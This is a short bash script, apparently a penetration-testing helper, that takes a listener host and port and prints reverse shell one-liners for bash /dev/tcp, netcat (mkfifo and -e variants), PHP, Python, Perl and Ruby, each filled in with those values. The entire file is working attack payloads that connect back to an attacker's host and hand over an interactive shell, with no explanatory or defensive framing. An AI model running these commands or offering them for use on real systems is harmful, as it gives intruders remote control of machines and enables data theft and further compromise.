#!/bin/bash
rand=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
echo "---------------------------------------------------------------------------------------------"
lhost="\e[91m$1\e[39m"
lport="\e[92m$2\e[39m"
echo "netcat/sh:"
echo -e "bash -i >& /dev/tcp/$lhost/$lport 0>&1"
echo -e "mkfifo /tmp/$rand; /bin/sh -i < /tmp/$rand 2>&1 | nc $lhost $lport > /tmp/$rand; rm /tmp/$rand"
echo -e "nc -nv $lhost $lport -e /bin/bash"
echo "---------------------------------------------------------------------------------------------"
echo "PHP:"
echo -e "php -r '\$sock=fsockopen(\"$lhost\",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
echo "---------------------------------------------------------------------------------------------"
echo "Python:"
echo -e "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
echo "---------------------------------------------------------------------------------------------"
echo "Perl:"
echo -e "perl -e 'use Socket;\$i=\"$lhost\";\$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
echo "---------------------------------------------------------------------------------------------"
echo "Ruby:"
echo -e "ruby -rsocket -e'f=TCPSocket.open(\"$lhost\",$lport).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
echo "---------------------------------------------------------------------------------------------"
